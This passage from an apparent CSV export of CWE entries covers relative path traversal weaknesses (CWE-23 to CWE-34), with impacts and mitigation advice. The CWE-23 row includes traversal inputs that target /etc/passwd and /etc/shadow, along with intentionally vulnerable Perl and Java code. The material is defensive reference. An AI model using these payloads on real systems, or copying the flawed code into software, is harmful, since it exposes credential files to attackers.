may be required for customization.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.For example, ID 1 could map to ""inbox.txt"" and ID 2 could map to ""profile.txt"". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.Phases:  Architecture and Design; OperationStrategy:  Attack Surface ReductionStore library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.Phase:  ImplementationEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.Phases:  Operation; ImplementationStrategy:  Environment HardeningWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues."
CWE-23: Relative Path Traversal,"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as "".."" that can resolve to a location that is outside of that directory.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsThe attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Files or DirectoriesThe attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesThe attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product., Likelihood: ","Example 1The following URLs are vulnerable to this attack:(bad code)http://example.com.br/get-files.jsp?file=report.pdfhttp://example.com.br/get-page.php?home=aaa.htmlhttp://example.com.br/some-page.asp?page=index.htmlA simple way to execute this attack is like this:(attack code)http://example.com.br/get-files?file=../../../../somedir/somefilehttp://example.com.br/../../../../etc/shadowhttp://example.com.br/get-files?file=../../../../etc/passwdExample 2The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.(bad code)Example Language:Perlmy $dataPath = ""/users/cwe/profiles"";my $username = param(""user"");my $profilePath = $dataPath . ""/"" . $username;open(my $fh, ""<"", $profilePath) || ExitError(""profile read error: $profilePath"");print ""<ul>\n"";while (<$fh>) {print ""<li>$_</li>\n"";}print ""</ul>\n"";While the programmer intends to access files such as ""/users/cwe/profiles/alice"" or ""/users/cwe/profiles/bob"", there is no verification of the incoming user parameter. An attacker could provide a string such as:(attack code)../../../etc/passwdThe program would generate a profile pathname like this:(result)/users/cwe/profiles/../../../etc/passwdWhen the file is opened, the operating system resolves the ""../"" during path canonicalization and actually accesses this file:(result)/etc/passwdAs a result, the attacker could read the entire text of the password file.Notice how this code also contains an error message information leak (CWE-209) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.Example 3The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.(good code)Example Language:HTML<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">Choose a file to upload:<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/></form>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.(bad code)Example Language:Javapublic class FileUploadServlet extends HttpServlet {...protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {response.setContentType(""text/html"");PrintWriter out = response.getWriter();String contentType = request.getContentType();// the starting position of the boundary headerint ind = contentType.indexOf(""boundary="");String boundary = contentType.substring(ind+9);String pLine = new String();String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value// verify that content type is multipart form dataif (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {// extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));...pLine = br.readLine();String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));...// output the file to the local upload directorytry {BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));for (String line; (line=br.readLine())!=null; ) {if (line.indexOf(boundary) == -1) {bw.write(line);bw.newLine();bw.flush();}} //end of for loopbw.close();} catch (IOException ex) {...}// output successful upload response HTML page}// output unsuccessful upload response HTML pageelse{...}}...}This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use ""../"" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes "".."" sequences and symbolic links (CWE-23,CWE-59). This includes:realpath() in CgetCanonicalPath() in JavaGetFullPath() in ASP.NETrealpath() or abs_path() in Perlrealpath() in PHP"
CWE-24: Path Traversal: '../filedir',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""../"" sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-25: Path Traversal: '/../filedir',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""/../"" sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-26: Path Traversal: '/dir/../filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""/dir/../filename"" sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-27: Path Traversal: 'dir/../../filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize multiple internal ""../"" sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-28: Path Traversal: '..\filedir',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize ""..\"" sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-29: Path Traversal: '\..\filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-30: Path Traversal: '\dir\..\filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\dir\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-31: Path Traversal: 'dir\..\..\filename',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize 'dir\..\..\filename' (multiple internal backslash dot dot) sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-32: Path Traversal: '...' (Triple Dot),"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '...' (triple dot) sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-33: Path Traversal: '....' (Multiple Dot),"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....' (multiple dot) sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-34: Path Traversal: '....//',"The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '....//' (doubled dot dot slash) sequences that can resolve to a location that is outside of that directory.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
